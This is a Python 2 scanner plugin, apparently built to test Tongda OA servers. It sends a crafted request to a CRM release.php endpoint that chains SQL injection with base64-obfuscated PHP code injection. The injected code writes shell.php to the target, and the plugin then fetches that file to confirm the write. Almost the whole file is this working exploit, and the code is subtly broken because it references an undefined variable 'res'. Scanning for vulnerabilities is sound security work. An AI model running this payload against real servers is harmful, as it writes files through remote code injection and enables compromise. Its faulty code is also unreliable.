#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expsetp1="%s%s"%(url,"general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(bnZzX3Rlc3RfZ2V0d2Vic2hlbGw))}")
        expsetp2="%s%s"%(url,"general/email/index.php")
        expsetp3="%s%s"%(url,"general/email/shell.php")
        res1, content1 = requestUrl(http,expsetp1,ob['task_id'],ob['domain_id'])
        res2, content2 = requestUrl(http,expsetp2,ob['task_id'],ob['domain_id'])
        res3, content3 = requestUrl(http,expsetp3,ob['task_id'],ob['domain_id'])
        if content3.find("nvs_test_getwebshell")>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:tongdaoagetwebshellscriptt.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:tongdaoagetwebshellscriptt.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def